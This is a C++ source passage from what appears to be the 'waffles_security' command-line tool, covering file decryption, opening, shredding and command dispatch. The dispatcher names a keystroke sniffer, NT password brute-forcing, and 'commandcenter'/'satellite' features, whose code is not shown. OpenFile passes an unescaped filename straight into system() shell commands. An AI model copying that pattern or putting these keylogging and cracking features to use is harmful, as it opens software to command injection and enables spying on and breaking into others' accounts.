// Iterate the top-level windows in a process.
class CMainWindowIterator : public CWindowIterator  {
protected:
   DWORD m_pid;                     // process id
   virtual BOOL OnWindow(HWND hwnd);
public:
   CMainWindowIterator(DWORD pid, DWORD nAlloc=1024);
   ~CMainWindowIterator();
};

CWindowIterator::CWindowIterator(DWORD nAlloc)
{
   GAssert(nAlloc > 0);
   m_current = m_count = 0;
   m_hwnds = new HWND [nAlloc];
   m_nAlloc = nAlloc;
}

CWindowIterator::~CWindowIterator()
{
   delete [] m_hwnds;
}

HWND CWindowIterator::First()
{
   ::EnumWindows(EnumProc, (LPARAM)this);
   m_current = 0;
   return Next();
}

// Static proc passes to virtual fn.
BOOL CALLBACK CWindowIterator::EnumProc(HWND hwnd, LPARAM lp)
{
   return ((CWindowIterator*)lp)->OnEnumProc(hwnd);
}

// Virtual proc: add HWND to array if OnWindow says OK
BOOL CWindowIterator::OnEnumProc(HWND hwnd)
{
   if (OnWindow(hwnd)) {
      if (m_count < m_nAlloc)
         m_hwnds[m_count++] = hwnd;
   }
   return TRUE; // keep looking
}

CMainWindowIterator::CMainWindowIterator(DWORD pid, DWORD nAlloc)
   : CWindowIterator(nAlloc)
{
   m_pid = pid;
}

CMainWindowIterator::~CMainWindowIterator()
{
}

// virtual override: is this window a main window of my process?
BOOL CMainWindowIterator::OnWindow(HWND hwnd)
{
   if (GetWindowLong(hwnd,GWL_STYLE) & WS_VISIBLE) {
      DWORD pidwin;
      GetWindowThreadProcessId(hwnd, &pidwin);
      if (pidwin==m_pid)
         return TRUE;
   }
   return FALSE;
}
#endif // WINDOWS

void OpenFile(const char* szFilename)
{
#ifdef WINDOWS
	SHELLEXECUTEINFO sei;
	memset(&sei, '\0', sizeof(SHELLEXECUTEINFO));
	sei.cbSize = sizeof(SHELLEXECUTEINFO);
	sei.fMask = SEE_MASK_NOCLOSEPROCESS/* | SEE_MASK_NOZONECHECKS*/;
	sei.hwnd = NULL;
	sei.lpVerb = NULL;
	sei.lpFile = szFilename;
	sei.lpParameters = NULL;
	sei.lpDirectory = NULL;
	sei.nShow = SW_SHOW;
	ShellExecuteEx(&sei);
	CMainWindowIterator itw((DWORD)sei.hProcess/*pid*/);
	SetForegroundWindow(itw.First());
	//ShellExecute(NULL, NULL, szFilename, NULL, NULL, SW_SHOW);
#else
#ifdef DARWIN
	// Mac
	GTEMPBUF(char, pBuf, 32 + strlen(szFilename));
	strcpy(pBuf, "open ");
	strcat(pBuf, szFilename);
	strcat(pBuf, " &");
	system(pBuf);
#else // DARWIN
	GTEMPBUF(char, pBuf, 32 + strlen(szFilename));

	// Gnome
	strcpy(pBuf, "gnome-open ");
	strcat(pBuf, szFilename);
	if(system(pBuf) != 0)
	{
		// KDE
		//strcpy(pBuf, "kfmclient exec ");
		strcpy(pBuf, "konqueror ");
		strcat(pBuf, szFilename);
		strcat(pBuf, " &");
		if(system(pBuf) != 0)
			cout << "Failed to open " << szFilename << ". Please open it manually.\n";
	}
#endif // !DARWIN
#endif // !WINDOWS
}

void open(GArgReader& args)
{
	const char* filename = args.pop_string();
	char passphrase[MAX_PASSPHRASE_LEN];
	readInPassphrase(passphrase, MAX_PASSPHRASE_LEN);
	PassphraseWiper pw(passphrase);
	string basename;
	char salt[SALT_LEN];
	decryptFile(filename, passphrase, salt, &basename);
	OpenFile(basename.c_str());
	while(true)
	{
#ifndef WINDOWS
		cout << "(You can press CTRL-z to suspend, then enter \"fg\" to resume.)\n";
#endif
		cout << "When you are done with the files, please close any programs that\n";
		cout << "were used to view or edit them, then choose one of these options:\n";
		cout << "	1) Shred the decrypted files.\n";
		cout << "	2) Re-encrypt to save any changes, then shred the decrypted files.\n";
		cout << "	3) Leave the files decrypted.\n";
		cout << "Enter your choice (1,2, or 3)? ";
		cout.flush();
		char choice[2];
		cin.getline(choice,2);
		if(strcmp(choice, "1") == 0)
		{
			shred(basename.c_str());
			break;
		}
		else if(strcmp(choice, "2") == 0)
		{
			// Determine a name to back up the old encrypted file to
			string backupname = filename;
			backupname += ".backup";
			
			// Delete any file with the backup name
			if(access(backupname.c_str(), 0) == 0)
			{
				if(unlink(backupname.c_str()) != 0)
					ThrowError("Error deleting the file ", backupname.c_str());
			}
			
			// Rename the old encrypted file to the backup name
			if(rename(filename, backupname.c_str()) != 0)
				ThrowError("Error renaming old encryped file");
			
			// Re-encrypt the files
			encryptPath(basename.c_str(), passphrase, filename, false);
			
			// Shred the files
			shred(basename.c_str());
			
			// Delete the old encrypted file
			if(unlink(backupname.c_str()) != 0)
				ThrowError("Error deleting the file ", backupname.c_str());
			break;
		}
		else if(strcmp(choice, "3") == 0)
			break;
		cout << "\n\nInvalid choice.\n\n";
	}
}

void ShowUsage()
{
	cout << "Full Usage Information\n";
	cout << "[Square brackets] are used to indicate required arguments.\n";
	cout << "<Angled brackets> are used to indicate optional arguments.\n";
	cout << "\n";
	UsageNode* pUsageTree = makeCryptoUsageTree();
	Holder<UsageNode> hUsageTree(pUsageTree);
	pUsageTree->print(cout, 0, 3, 76, 1000, true);
	cout.flush();
}

void showError(GArgReader& args, const char* szMessage)
{
	cerr << "_________________________________\n";
	cerr << szMessage << "\n\n";
	args.set_pos(1);
	const char* szCommand = args.peek();
	UsageNode* pUsageTree = makeCryptoUsageTree();
	Holder<UsageNode> hUsageTree(pUsageTree);
	if(szCommand)
	{
		UsageNode* pUsageCommand = pUsageTree->choice(szCommand);
		if(pUsageCommand)
		{
			cerr << "Brief Usage Information:\n\n";
			cerr << "waffles_security ";
			pUsageCommand->print(cerr, 0, 3, 76, 1000, true);
		}
		else
		{
			cerr << "Brief Usage Information:\n\n";
			pUsageTree->print(cerr, 0, 3, 76, 1, false);
		}
	}
	else
	{
		pUsageTree->print(cerr, 0, 3, 76, 1, false);
		cerr << "\nFor more specific usage information, enter as much of the command as you know.\n";
	}
	cerr << "\nTo see full usage information, run:\n	waffles_security usage\n\n";
//	cerr << "For a graphical tool that will help you to build a command, run:\n	waffles_wizard\n";
	cerr.flush();
}

void doit(GArgReader& args)
{
	if(args.size() < 1) ThrowError("Expected a command");
	else if(args.if_pop("usage")) ShowUsage();
	else if(args.if_pop("bandwidthclient")) doBandwidthClient(args);
	else if(args.if_pop("bandwidthserver")) doBandwidthServer(args);
	//else if(args.if_pop("li")) doLogin(args);
	else if(args.if_pop("bruteforcentpassword")) bruteForceNTPassword(args);
	else if(args.if_pop("commandcenter")) doCommandCenter(args);
	else if(args.if_pop("decrypt")) decrypt(args);
	else if(args.if_pop("encrypt")) encrypt(args);
	else if(args.if_pop("logkeys")) KeystrokeSniffer::logKeyStrokes(args);
	else if(args.if_pop("makegarbage")) makeGarbage(args);
	else if(args.if_pop("nthash")) nthash(args);
	else if(args.if_pop("open")) open(args);
	else if(args.if_pop("satellite")) doSatellite(args);
	else if(args.if_pop("shred")) shred(args);
	else if(args.if_pop("wget")) wget(args);
	else ThrowError("Unrecognized command: ", args.peek());
}

#ifdef WINDOWS
#	ifndef _DEBUG
#		define USE_WINMAIN
#	endif
#endif


#ifdef NOCONSOLE
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	// Parse the args
	GTEMPBUF(char, buf, strlen(lpCmdLine));
	strcpy(buf, lpCmdLine);
	bool quot = false;
	int start = 0;
	vector<const char*> args;
	for(int i = 0; buf[i] != '\0'; i++)
	{
		if(!quot)
		{
			if(buf[i] == '"')
				quot = true;
			else
			{
				if(buf[i] == ' ')
				{
					args.push_back(buf + start);
					buf[i] = '\0';
					start = i + 1;
				}
			}
		}
		else
		{
			if(buf[i] == '"')
				quot = false;
		}
	}
	args.push_back(buf + start);
	GTEMPBUF(char*, argv, args.size() + 1);
	for(size_t i = 0; i < args.size(); i++)
		argv[i] = (char*)args[i];
	argv[args.size()] = NULL;
	GArgReader argReader(args.size(), argv);
	try
	{
		doit(argReader);
	}
	catch(std::exception& e)
	{
		showError(argReader, e.what());
	}
}

#else
int main(int argc, char *argv[])
{
#ifdef _DEBUG
	GApp::enableFloatingPointExceptions();
#endif
	int nRet = 1;
	GArgReader args(argc, argv);
	args.pop_string(); // advance past the app name
	try
	{
		doit(args);
		nRet = 0;
	}
	catch(std::exception& e)
	{
		showError(args, e.what());
	}

	return nRet;
}
#endif // !USE_WINMAIN

